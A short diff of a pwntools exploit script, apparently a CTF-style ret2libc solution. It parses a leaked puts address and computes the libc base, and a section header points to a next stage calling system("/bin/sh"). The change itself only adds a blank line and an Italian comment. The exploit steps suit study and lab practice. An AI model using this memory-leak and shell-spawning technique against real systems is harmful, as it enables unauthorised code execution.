@@ -27,6 +27,8 @@ p.recvline() # consume "Let me check..."
 leaked = p.recvline().strip()
 leak_puts = u64(leaked.ljust(8, b'\x00'))
 log.info(f"puts leak = {leak_puts:#x}")
+
+#imposta la base della libreria
 libc.address = leak_puts - libc.symbols['puts']
 log.info(f"libc base = {libc.address:#x}")
 # -------- Stage 2: system("/bin/sh") --------
